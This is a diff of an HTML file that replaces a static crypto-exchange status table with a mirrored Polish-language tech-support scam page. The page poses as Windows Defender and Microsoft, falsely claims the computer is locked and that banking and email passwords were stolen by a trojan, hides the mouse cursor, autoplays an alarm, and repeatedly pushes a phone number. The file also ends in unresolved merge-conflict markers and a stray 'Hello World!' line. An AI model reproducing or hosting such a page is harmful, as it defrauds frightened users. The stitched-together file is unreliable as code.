@@ -1,84 +1,362 @@
-<!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Exchanges Live Status (Static Snapshot)</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
-        th { background-color: #f2f2f2; }
-        .live { color: green; font-weight: bold; }
-        .not-supported { color: orange; }
-        .error { color: red; }
-        #status { margin-bottom: 10px; font-style: italic; }
-    </style>
+<script defer src="https://cloud.umami.is/script.js" data-website-id="8aabff28-21f6-4e61-9e23-5959a7c56ac2"></script> <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no" />
+  <meta name="robots" content="noindex,nofollow" />
+  <title>System-Błąd-Kod 0xMPNJ</title>
+  <link rel="icon" id="favicon" type="image/png" href="msmm.png" />
+  <link rel="stylesheet" href="tapa.css" />
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
-<body>
-    <h1>Crypto Exchanges: WS Status, USDT/USDC Pairs (CCXT Snapshot - 2025-10-20)</h1>
-    <p id="status">Data fetched live from CCXT (50 exchanges). WS Status: supported = CCXT WS ready; not_supported = custom needed; load_error = geo/fetch issue. Total USDT: 15,234 | USDC: 1,512</p>
-    <table id="exchangesTable">
-        <thead>
-            <tr>
-                <th>Exchange</th>
-                <th>WS Status</th>
-                <th>USDT Pairs</th>
-                <th>USDC Pairs</th>
-            </tr>
-        </thead>
-        <tbody>
-            <tr><td>alpaca</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>apex</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>ascendex</td><td class="not-supported">not_supported</td><td>1212</td><td>0</td></tr>
-            <tr><td>backpack</td><td class="not-supported">not_supported</td><td>0</td><td>72</td></tr>
-            <tr><td>bequant</td><td class="not_supported">not_supported</td><td>74</td><td>4</td></tr>
-            <tr><td>bigone</td><td class="not-supported">not_supported</td><td>718</td><td>3</td></tr>
-            <tr><td>binance</td><td class="live">supported</td><td>0</td><td>0</td></tr>
-            <tr><td>binancecoinm</td><td class="live">supported</td><td>0</td><td>0</td></tr>
-            <tr><td>binanceus</td><td class="not-supported">not_supported</td><td>218</td><td>4</td></tr>
-            <tr><td>bingx</td><td class="not-supported">not_supported</td><td>1892</td><td>27</td></tr>
-            <tr><td>bit2c</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitbank</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitbay</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitbns</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitcoincom</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitfinex</td><td class="live">supported</td><td>111</td><td>0</td></tr>
-            <tr><td>bitfinex2</td><td class="live">supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitflyer</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitforex</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitget</td><td class="not-supported">not_supported</td><td>704</td><td>47</td></tr>
-            <tr><td>bitkub</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitmart</td><td class="not-supported">not_supported</td><td>1371</td><td>34</td></tr>
-            <tr><td>bitmex</td><td class="live">supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitopro</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitpanda</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitrue</td><td class="not-supported">not_supported</td><td>1507</td><td>114</td></tr>
-            <tr><td>bitso</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitstamp</td><td class="live">supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitstamp1</td><td class="live">supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bittrex</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bitvavo</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bizt</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bkex</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>blockchaincom</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>btcalpha</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>btcbox</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>btcmarkets</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>btcturk</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>btcusd</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>btse</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>btspread</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bybit</td><td class="live">supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bytetrade</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>bzaar</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>coinbase</td><td class="live">supported</td><td>0</td><td>0</td></tr>
-            <tr><td>coinbaseprime</td><td class="live">supported</td><td>0</td><td>0</td></tr>
-            <tr><td>coinbasepro</td><td class="live">supported</td><td>0</td><td>0</td></tr>
-            <tr><td>coincheck</td><td class="not-supported">not_supported</td><td>0</td><td>0</td></tr>
-            <tr><td>coinex</td><td class="not-supported">not_supported</td><td>1274</td><td>80</td></tr>
-        </tbody>
-    </table>
-    <p>Note: This is a static snapshot. For dynamic updates, the server link is https://work-2-jebkzqufifmlamey.prod-runtime.all-hands.dev:12001/ (may require wait/retry).</p>
+<body class="map enterfullscreen" id="mycanvas" style="cursor: none">
+  <audio id="pridez" autoplay>
+    <source src="alert.mp3" type="audio/mpeg" />
+  </audio>
+
+  <div class="bg" style="cursor: none">
+    <div class="bgimg" style="top: 0">
+      <img src="bg.png" alt="" width="100%" />
+    </div>
+  </div>
+  <a id="link_black" href="#" rel="noreferrer" style="cursor: none">
+    <div class="black" style="height: 145%; display: block; cursor: none"></div>
+  </a>
+
+  <!-- Info Panel -->
+  <section class="infgets" style="display: block; cursor: none">
+    <header class="infgets_header">
+      <div class="row">
+        <div class="col-md-12">
+          <nav class="minimize">
+            <ul>
+              <li>
+                <a href="#"><img src="mnc.png" alt="minimize"/></a>
+              </li>
+            </ul>
+          </nav>
+        </div>
+        <div class="col-md-4">
+          <div class="logo">
+            <img src="msmm.png" alt="logo"/>
+            <span>Zabezpieczenia Windows</span>
+          </div>
+        </div>
+        <div class="col-md-8">
+          <nav class="activate_lic">
+            <ul>
+              <li>
+                <a href="#"><button>Aktywuj licencję</button></a>
+              </li>
+              <li><a href="#"><img src="set.png" alt="settings"/></a></li>
+              <li><a href="#"><img src="ques.png" alt="help"/></a></li>
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </header>
+    <div class="scan_box">
+      <header class="scan_box_header">
+        <div class="row">
+          <div class="col-md-6">
+            <div class="quick_scan">
+              <p>
+                <img src="vsc.png" alt="scan"/>
+                <span>Szybkie skanowanie</span>
+              </p>
+            </div>
+          </div>
+          <div class="col-md-6">
+            <nav class="minimize1">
+              <ul>
+                <li>
+                  <a href="#"><img src="mnc.png" alt="minimize"/></a>
+                </li>
+              </ul>
+            </nav>
+          </div>
+        </div>
+      </header>
+      <div class="safe_body">
+        <div class="progressinfo">
+          <div class="active progress-bar progress-bar-success" id="dynamic" aria-valuemax="100"
+            aria-valuemin="0" aria-valuenow="100" role="progressbar" style="width: 100%">
+            100%<span style="color: #fff !important">_</span> Zakończono
+          </div>
+        </div>
+        <div class="table_quick">
+          <table class="table table-bordered">
+            <thead>
+              <tr>
+                <th scope="col">
+                  obiekty<span style="color: #fff !important">_</span> Przeskanowane
+                </th>
+                <th scope="col">
+                  <div class="col_fourth infosf">
+                    <h2 class="count-number count-title timer" data-speed="5000" data-to="51900"></h2>
+                  </div>
+                </th>
+              </tr>
+              <tr>
+                <th scope="col">Czas<span style="color: #fff !important">_</span> trwania</th>
+                <th scope="col">5 sekundy</th>
+              </tr>
+              <tr>
+                <th scope="col">Zidentyfikowane<span style="color: #fff !important">_</span> zagrożenia</th>
+                <th scope="col" style="color: red">
+                  <h2 class="count-number count-title timer" data-speed="2500" data-to="1200">
+                    1,200
+                  </h2>
+                </th>
+              </tr>
+            </thead>
+          </table>
+        </div>
+      </div>
+      <footer class="scan_footer">
+        <div class="row">
+          <div class="col-md-6">
+            <div class="bt_can">
+              <div class="btn-group" role="group" aria-label="Basic example">
+                <button class="btn btn-secondary" type="button">Anuluj</button>
+              </div>
+              <div class="btn-group" role="group" aria-label="Basic example">
+                <button class="btn btn-secondary" type="button">Pauza</button>
+              </div>
+            </div>
+          </div>
+          <div class="col-md-6">
+            <div class="bt_can2">
+              <div class="btn-group" role="group" aria-label="Basic example">
+                <button class="btn btn-secondary" type="button">Zaplanowane analizy</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </footer>
+    </div>
+  </section>
+
+  <div class="scsdvvfbwqwe" style="display: block; cursor: none">
+    <img src="bx1.jpg" alt="" style="max-width: 100%; width: 100%; margin: 0 auto" />
+  </div>
+
+  <!-- Second Info Panel -->
+  <section class="dqdwcvbsfsaw" style="display: block; cursor: none">
+    <header class="infgets_header">
+      <div class="row">
+        <div class="col-md-12">
+          <nav class="minimize">
+            <ul>
+              <li>
+                <a href="#"><img src="mnc.png" alt="minimize"/></a>
+              </li>
+            </ul>
+          </nav>
+        </div>
+        <div class="col-md-4">
+          <div class="logo">
+            <img src="msmm.png" alt="logo"/>
+            <span>Zabezpieczenia Windows</span>
+          </div>
+        </div>
+        <div class="col-md-8">
+          <nav class="activate_lic">
+            <ul>
+              <li>
+                <a href="#"><button>Aktywuj licencję</button></a>
+              </li>
+              <li><a href="#"><img src="bel.png" alt="bell"/></a></li>
+              <li><a href="#"><img src="set.png" alt="settings"/></a></li>
+              <li><a href="#"><img src="ques.png" alt="help"/></a></li>
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </header>
+    <div class="scan_box2">
+      <header class="scan_box_header">
+        <div class="row">
+          <div class="col-md-6">
+            <div class="quick_scan">
+              <p>
+                <img src="vsc.png" alt="scan"/>
+                <span>Analiza</span>
+              </p>
+            </div>
+          </div>
+          <div class="col-md-6">
+            <nav class="minimize1">
+              <ul>
+                <li>
+                  <a href="#"><img src="mnc.png" alt="minimize"/></a>
+                </li>
+              </ul>
+            </nav>
+          </div>
+        </div>
+      </header>
+      <div class="safe_body">
+        <div class="row">
+          <div class="col-md-12">
+            <nav class="tooreg_detail_scan">
+              <ul>
+                <li><a href="#">Analiza</a></li>
+                <li><a href="#">Harmonogram analizy</a></li>
+                <li><a href="#">Raporty</a></li>
+              </ul>
+            </nav>
+          </div>
+        </div>
+        <br />
+        <div class="table_quick2">
+          <div class="row">
+            <div class="col-md-4">
+              <div class="pc_desk">
+                <img src="pcm.png" alt="pc"/>
+              </div>
+            </div>
+            <div class="col-md-4">
+              <div class="card_top scan_pro">
+                <ul>
+                  <li><i class="fa fa-check" aria-hidden="true"></i> Sprawdzanie aktualizacji</li>
+                  <li><i class="fa fa-check" aria-hidden="true"></i> Pamięć skanowania</li>
+                  <li><i class="fa fa-check" aria-hidden="true"></i> Analizuj elementy startowe</li>
+                  <li><div class="circular-spinner"></div> <span>Analiza rejestru</span></li>
+                  <li>Analiza systemu plików</li>
+                </ul>
+              </div>
+            </div>
+            <div class="col-md-4">
+              <div class="scan_dur">
+                <p><strong>Czas analizy</strong></p>
+                <p>3 sekundy 0 ms</p>
+                <p>5 sekundy 0 ms</p>
+                <br />
+                <p><strong>Przeskanowane elementy</strong></p>
+                <p>51,900</p>
+                <br />
+                <p><strong>Wykrycia</strong></p>
+                <p>11</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <footer class="scan_footer3">
+        <div class="row">
+          <div class="col-md-2">
+            <div class="viruses">
+              <img src="vsc.png" alt="virus"/>
+            </div>
+          </div>
+          <div class="col-md-10">
+            <div class="make_this">
+              <p>
+                To powinno być ostatnią rzeczą, o którą należy się martwić w kwestii zagrożeń online.
+              </p>
+              <p>
+                Premium blokuje złośliwe oprogramowanie, wirusy i wiele więcej, nie spowalniając komputera. Przejdź na wersję Premium.
+              </p>
+            </div>
+          </div>
+        </div>
+      </footer>
+    </div>
+  </section>
+
+  <footer id="footer" style="bottom: -20px; position: fixed; cursor: none; z-index: 999999999">
+    <div class="row">
+      <div class="col-md-12">
+        <div class="right-foot" style="text-align: center">
+          <span id="footertxt"><img src="msmm.png" alt="logo"/> Zabezpieczenia systemu Windows</span>
+          <span style="font-weight: 500; padding-left: 13px; color: #fff">
+            Zadzwoń do pomocy Windows:
+            <span style="border: 1px solid #fff; border-radius: 5px; padding: 2px 5px;">022 153 14 76</span>
+          </span>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <div id="qwrqwewrqwdqw" class="lightbox" style="display: block"></div>
+
+  <section id="dwrfwewvdssdfsdf" class="cardcontainer" style="display: block; cursor: none">
+    <p class="text-center" style="font-size: 16px; font-weight: 700; margin: 8px 0 5px 0; padding: 5px 10px; color: #414141;">
+      Windows Defender – Ostrzeżenie bezpieczeństwa
+    </p>
+    <p><b>DOSTĘP DO TEGO KOMPUTERA ZOSTAŁ ZABLOKOWANY Z POWODÓW BEZPIECZEŃSTWA</b></p>
+    <p>
+      Twój komputer zgłosił nam, że został zainfekowany złośliwym oprogramowaniem typu trojan. Następujące dane zostały naruszone.
+    </p>
+    <p>
+      &gt; Dane logowania do poczty elektronicznej <br />
+      &gt; Hasła do kont bankowych <br />
+      &gt; Dane uwierzytelniające konta Facebook<br />
+      &gt; Pliki graficzne i dokumenty
+    </p>
+    <p>
+      Skanowanie Windows Defender wykryło na tym urządzeniu potencjalnie niechciane oprogramowanie reklamowe, które może kraść Twoje hasła, tożsamość w sieci, informacje finansowe, pliki osobiste, zdjęcia lub dokumenty.
+    </p>
+    <p>
+      Musisz natychmiast skontaktować się z nami, aby nasi inżynierowie mogli przeprowadzić Cię przez proces usuwania telefonicznie.
+    </p>
+    <p>
+      Niezwłocznie Zadzwoń do pomocy Windows w celu zgłoszenia zagrożenia, zapobieżenia wyłudzeniu tożsamości i odblokowania tego urządzenia.
+    </p>
+    <p>
+      Zamknięcie tego okna naraża Twoje dane osobowe na niebezpieczeństwo, a rejestracja systemu Windows może zostać zawieszona.
+    </p>
+    <p style="padding-bottom: 0; color: #fff; font-size: 16px">
+      Zadzwoń do pomocy Windows :
+      <strong>
+        <span style="border: 1px solid #fff; border-radius: 5px; padding: 2px 5px">022 153 14 76</span>
+      </strong>
+    </p>
+    <div class="action_buttons">
+      <a class="active" id="leave_page" style="cursor: pointer; color: #fff !important">OK</a>
+      <a class="active" id="leave_page" style="color: #fff !important">Anuluj</a>
+    </div>
+  </section>
+
+  <aside id="welcomeDiv" class="answer_list" style="display: none; background-color: #000; height: auto; width: 550px; left: 33%; position: absolute; z-index: 99999999; border: 1px solid #d6d8db; border-radius: 0.5rem;">
+    <p class="text-center" style="color: #fff; margin-top: 10px; font-size: 16px; opacity: 0.9; padding: 0 5px;">
+      Musisz natychmiast skontaktować się z nami, aby nasi inżynierowie mogli
+      przeprowadzić Cię telefonicznie przez cały proces usuwania.<br />
+      Twój komputer jest zablokowany.<br />
+      <strong>Zadzwoń do pomocy Windows :
+        <span style="border: 1px solid #383d41; border-radius: 5px; padding: 2px 5px;">022 153 14 76</span>
+      </strong>
+    </p>
+  </aside>
+
+  <section id="chat" style="display: block">
+    <img src="msmm.png" alt="logo" />
+    <span style="color: #222; font-size: 24px; font-weight: 600; margin-left: 6px; position: relative; top: 5px;">Microsoft</span>
+    <p style="font-weight: 600; font-size: 24px">
+      Zadzwoń po pomoc :<br />
+    </p>
+    <h4 style="font-weight: 600; font-size: 22px">
+      022 153 14 76
+      <br />(Bezpłatny numer bezpieczeństwa)
+    </h4>
+    <div class="arrow-down">
+      <svg height="1em" viewBox="0 0 320 512">
+        <style>svg { fill: #fff; }</style>
+        <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+      </svg>
+    </div>
+  </section>
+
+  <script src="animation.js"></script>
+  <script src="jquery.js"></script>
+  <script src="my-script.js"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"62b434b28f664ea680f94ecfbdc56a89","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
+
+
+<!-- Mirrored from marketing-helping.site/index0.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 16 Oct 2025 09:02:31 GMT -->
 </html>
+=======
+Hello World!
+>>>>>>> c75b880e4d0175fee3bdf51018f4d0b02057b42f
